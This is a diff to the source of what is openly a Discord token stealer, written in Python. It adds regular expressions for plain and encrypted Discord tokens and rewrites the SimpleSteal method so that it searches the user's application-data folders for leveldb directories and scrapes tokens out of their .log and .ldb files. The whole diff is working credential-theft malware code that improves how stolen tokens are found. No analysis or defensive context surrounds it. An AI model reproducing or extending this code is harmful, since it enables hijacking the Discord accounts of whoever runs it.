@@ -447,6 +447,8 @@ class Discord:
     httpClient = PoolManager() # Client for http requests
     ROAMING = os.getenv("appdata")
     LOCALAPPDATA = os.getenv("localappdata")
+    REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
+    REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
 
     @staticmethod
     def GetHeaders(token: str = None) -> dict:
@@ -614,7 +616,7 @@ class Discord:
                         
                         for line in lines:
                             if line.strip():
-                                matches: list[str] = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
+                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                 for match in matches:
                                     match = match.rstrip("\\")
                                     if not match in encryptedTokens:
@@ -634,20 +636,29 @@ class Discord:
     @staticmethod
     def SimpleSteal(path: str) -> list[str]:
         tokens = list()
+        levelDbPaths = list()
 
-        for file in os.listdir():
-            if file.endswith((".log", ".ldb")):
-                filepath = os.path.join(path, file)
-                with open(filepath, errors= "ignore") as file:
-                    lines = file.readlines()
+        for root, dirs, _ in os.walk(path):
+            for dir in dirs:
+                if dir == "leveldb":
+                    levelDbPaths.append(os.path.join(root, dir))
+
+        for levelDbPath in levelDbPaths:
+            for file in os.listdir(levelDbPath):
+                if file.endswith((".log", ".ldb")):
+                    filepath = os.path.join(levelDbPath, file)
+                    with open(filepath, errors= "ignore") as file:
+                        lines = file.readlines()
                 
-                for line in lines:
-                    if line.strip():
-                        matches: list[str] = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line)
-                        for match in matches:
-                            match = match.rstrip("\\")
-                            if not match in tokens:
-                                tokens.append(match)
+                    for line in lines:
+                        if line.strip():
+                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
+                            for match in matches:
+                                match = match.rstrip("\\")
+                                if not match in tokens:
+                                    tokens.append(match)
+        
+        return tokens
     
     @staticmethod
     def FireFoxSteal(path: str) -> list[str]:
@@ -662,7 +673,7 @@ class Discord:
                 
                             for line in lines:
                                 if line.strip():
-                                    matches: list[str] = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line)
+                                    matches: list[str] = re.findall(Discord.REGEX, line)
                                     for match in matches:
                                         match = match.rstrip("\\")
                                         if not match in tokens:
